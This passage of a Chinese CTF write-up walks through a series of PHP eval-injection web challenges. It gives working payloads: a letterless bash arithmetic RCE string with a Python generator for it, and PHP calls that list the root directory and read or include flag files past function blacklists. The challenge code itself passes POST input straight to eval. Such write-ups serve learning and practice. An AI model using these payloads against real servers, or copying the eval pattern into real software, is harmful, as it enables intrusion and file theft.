xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>代表取反，</mtext><mn>0</mn><mtext>取反后为</mtext><mo>−</mo><mn>1</mn><mtext>，这样就可以先构造出</mtext><mo>−</mo><mn>37</mn><mtext>，取反后就为</mtext><mn>36</mn><mtext>，也就是</mtext></mrow><annotation encoding="application/x-tex">代表取反，0取反后为-1，这样就可以先构造出-37，取反后就为36，也就是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">出</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">7</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">为</span><span class="mord">3</span><span class="mord">6</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span></span></span></span> (()) 中有 37 个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 在加上取反，也就是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mtext> </mtext></mrow><annotation encoding="application/x-tex">((~</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mspace nobreak"> </span></span></span></span>(()))) 中有 37 个 - 1</p></blockquote><p>​先贴一个无字母数字 RCE 的总结：</p><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODEwNz90aW1lX18xMzExPW40JTJCeG5EMERjN0dRRHREa1dHT0RsaGplMCUzRDZBZ2doaXJPTW93aUQ=">无字母数字 webshell 总结</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYxNzc4MTI4L2FydGljbGUvZGV0YWlscy8xMjcwNjM0MDc/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjJENjgxNDdERS1BRUIzLTRCMUUtQjEyRC03NjE5RTREQzEzNTElMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmFsbC4lMjUyMiUyNTdEJmFtcDtyZXF1ZXN0X2lkPUQ2ODE0N0RFLUFFQjMtNEIxRS1CMTJELTc2MTlFNERDMTM1MSZhbXA7Yml6X2lkPTAmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19zZWFyY2hfcmVzdWx0Lm5vbmUtdGFzay1ibG9nLTJ+YWxsfmZpcnN0X3JhbmtfZWNwbV92MX5yYW5rX3YzMV9lY3BtLTEtMTI3MDYzNDA3LW51bGwtbnVsbC4xNDIlNUV2MTAwJTVFcGNfc2VhcmNoX3Jlc3VsdF9iYXNlNiZhbXA7dXRtX3Rlcm09bGludXglRTUlOEYlOTYlRTUlOEYlOEQlRTUlOTElQkQlRTQlQkIlQTRyY2UlRTglODQlOUElRTYlOUMlQUMmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3">无数字字母 rce 总结（取反、异或、自增、临时文件）</span></p><p>​可惜，做题的这个考点似乎这两篇文章里没有：</p><blockquote><p>双小括号 (()) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在 ((和)) 之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号，分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( )) 命令的执行结果。 可以使用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>获取</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>命令的结果，这和使用</mtext></mrow><annotation encoding="application/x-tex">获取 (( )) 命令的结果，这和使用</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">命</span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span></span></span></span>获得变量值是类似的。 可以在 (()) 前面加上<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>符号获取</mtext><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext>命令的执行结果，也即获取整个表达式的值。以</mtext><mi>c</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">号</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mopen">(</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">命</span><span class="mord cjk_fallback">令</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">达</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">以</span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c=((a+b)) 这样的写法是错误的，不加 $ 就不能取得表达式的结果。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;_&#125; #返回上一次的执行结果`</span><br><span class="line">echo $(()) #0</span><br><span class="line">echo $((~$(()))) #~0是-1</span><br><span class="line">$(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2</span><br><span class="line">echo $((~-37)) #~-37是36</span><br></pre></td></tr></table></figure><p>​所以 payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="built_in">$</span>((~<span class="built_in">$</span>((<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))<span class="built_in">$</span>((~<span class="built_in">$</span>(())))))))</span><br></pre></td></tr></table></figure><p>​可以用这个脚本生成简单的数字：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num_1 = <span class="string">&quot;$((~$(())))&quot;</span></span><br><span class="line">inta = <span class="number">36</span></span><br><span class="line">resp = <span class="string">&quot;$((~$((&quot;</span>+ num_1 * <span class="number">37</span>  +<span class="string">&quot;))))&quot;</span></span><br><span class="line"><span class="built_in">print</span>(resp)</span><br></pre></td></tr></table></figure><h1 id="web58"><a class="markdownIt-Anchor" href="#web58">#</a> Web58：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​乍一看，好像很简单，不过，当我 post 了一个 phpinfo 之后，发现了函数被禁了：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: phpinfo() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1</span><br></pre></td></tr></table></figure><p>​建议直接 fuzz 一下，看看具体哪些被 ban 了，这里就直接 show_source 了：</p><blockquote><p>c=show_source(‘flag.php’);<br>c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h1 id="web59"><a class="markdownIt-Anchor" href="#web59">#</a> Web59：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​具体不知道有些啥被 ban 了，只能一个个测，结果和上一题一样，show_source 依旧过了：</p><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web60"><a class="markdownIt-Anchor" href="#web60">#</a> Web60：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​一模一样，直接给 paylaod：</p><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web61"><a class="markdownIt-Anchor" href="#web61">#</a> Web61：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​show_source 百试不爽啊。</p><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web62"><a class="markdownIt-Anchor" href="#web62">#</a> Web62：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web63"><a class="markdownIt-Anchor" href="#web63">#</a> Web63：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web64"><a class="markdownIt-Anchor" href="#web64">#</a> Web64：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web65"><a class="markdownIt-Anchor" href="#web65">#</a> Web65：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><blockquote><p>c=show_source(“flag.php”);</p></blockquote><h1 id="web66"><a class="markdownIt-Anchor" href="#web66">#</a> Web66：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​show_source 函数被 ban 了，highlight_file 没有被 ban，试试看，结果 flag 没有在 flag.php 里，通过如下 payload 发现 flag 在根目录下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; dev [5] =&gt; etc [6] =&gt; flag.txt [7] =&gt; home [8] =&gt; lib [9] =&gt; media [10] =&gt; mnt [11] =&gt; opt [12] =&gt; proc [13] =&gt; root [14] =&gt; run [15] =&gt; sbin [16] =&gt; srv [17] =&gt; sys [18] =&gt; tmp [19] =&gt; usr [20] =&gt; var ) </span></span><br></pre></td></tr></table></figure><p>​那就用 highlight_file 去读根目录：</p><h1 id="web67"><a class="markdownIt-Anchor" href="#web67">#</a> Web67：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>​print_r 被过滤了，试试看 var_dump，没有被过滤，继续 scandir 去读目录结构。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web68"><a class="markdownIt-Anchor" href="#web68">#</a> Web68：</h1><p>​由于 highlight_file () 被 ban 了，读不到源码，所以就直接开打了，先测一下 var_dump，var_dump 和 scandir 都没有被 ban，直接读根目录，找到了 flag.txt：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#array(21) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(3) &quot;dev&quot; [5]=&gt; string(3) &quot;etc&quot; [6]=&gt; string(8) &quot;flag.txt&quot; [7]=&gt; string(4) &quot;home&quot; [8]=&gt; string(3) &quot;lib&quot; [9]=&gt; string(5) &quot;media&quot; [10]=&gt; string(3) &quot;mnt&quot; [11]=&gt; string(3) &quot;opt&quot; [12]=&gt; string(4) &quot;proc&quot; [13]=&gt; string(4) &quot;root&quot; [14]=&gt; string(3) &quot;run&quot; [15]=&gt; string(4) &quot;sbin&quot; [16]=&gt; string(3) &quot;srv&quot; [17]=&gt; string(3) &quot;sys&quot; [18]=&gt; string(3) &quot;tmp&quot; [19]=&gt; string(3) &quot;usr&quot; [20]=&gt; string(3) &quot;var&quot; &#125; </span></span><br></pre></td></tr></table></figure><p>​之后就是其他手法了，根据 txt 文件，推测 flag 应该不会被当作 php 代码执行，所以试着使用文件包含等手法读 flag：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br></pre></td></tr></table></figure><h1 id="web69"><a class="markdownIt-Anchor" href="#web69">#</a> Web69：</h1><p>​ban 了 highlight_file、var_dump，那就用 var_export，输出目录结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>​之后 include 包含 /flag.txt 文件即可得到 flag。</p><h1 id="web70"><a class="markdownIt-Anchor" href="#web70">#</a> Web70：</h1><p>​通过 var_export 读取文件目录结构，再用 include 包含 /flag.txt，和上面几个题没有任何区别。</p><h1 id="web71"><a class="markdownIt-Anchor" href="#web71">#</a> Web71：</h1><p>​附件里给了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​有几个点需要注意：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();<span class="comment">//得到缓冲区的数据。</span></span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();<span class="comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br></pre></td></tr></table></figure><p>​也就是说，这里需要在执行上面两个函数之前，把程序输出出来就行了，这个时候，就可以选择提前结束掉整个程序，因为缓冲区就是在程序结束之前需要将里面的所有内容全部输出才行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ 